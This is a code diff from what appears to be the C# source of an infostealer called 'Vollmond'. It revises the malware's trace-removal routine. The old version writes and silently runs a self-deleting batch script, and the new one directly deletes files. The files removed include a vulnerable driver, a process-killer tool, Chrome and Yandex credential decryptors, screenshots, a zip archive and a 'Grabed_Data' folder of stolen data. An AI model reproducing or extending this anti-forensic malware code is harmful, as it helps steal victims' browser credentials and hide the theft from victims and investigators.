@@ -8,39 +8,16 @@ namespace Vollmond
         {
             string tempPath = Path.GetTempPath();
 
-            string bat_content =
-                $"""
-                @echo off
-
-                taskkill /F /IM Killer.exe /T
-
-                del /q /f "{Path.Combine(tempPath, "screenshot.png")}"
-                del /q /f "{Program.zipPath}"
-                del /q /f "{Path.Combine(tempPath, "Killer.exe")}"
-                del /q /f "{Path.Combine(tempPath, "vulndriver.sys")}"
-                del /q /f "{Path.Combine(tempPath, "chromelevator_x64.exe")}"
-                del /q /f "{Path.Combine(tempPath, "YandexDecryptor.exe")}"
-                del /q /f "{Path.Combine(tempPath, "screenshot.jpg")}"
-                rmdir /q  /s "{Path.Combine(tempPath, "Grabed_Data")}"
-
-                (goto) 2>nul & del "%~f0"
-                """; // q - quiet f - force s - recursive
-
-            File.WriteAllText(Path.Combine(tempPath, "delete.bat"), bat_content);
-
-            ProcessStartInfo delete_process = new ProcessStartInfo()
-            {
-                FileName = Path.Combine(tempPath, "delete.bat"),
-                CreateNoWindow = true
-            };
-
-            Process.Start(delete_process);
+            File.Delete(Path.Combine(tempPath, "screenshot.png"));
+            File.Delete(Path.Combine(tempPath, "chromelevator_x64.exe"));
+            File.Delete(Program.zipPath);
+            Directory.Delete(Path.Combine(tempPath, "Grabed_Data"), true);
         }
 
         public static bool TracesExists()
         {
-            string tempPath = Path.GetTempPath();
-            if (File.Exists(Path.Combine(tempPath, "screenshot.png")))
+            string temp = Path.GetTempPath();
+            if (File.Exists(Program.zipPath) || File.Exists(Path.Combine(temp, "screenshot.png")) || Directory.Exists(Path.Combine(temp, "Grabed_Data")))
             {
                 return true;
             }
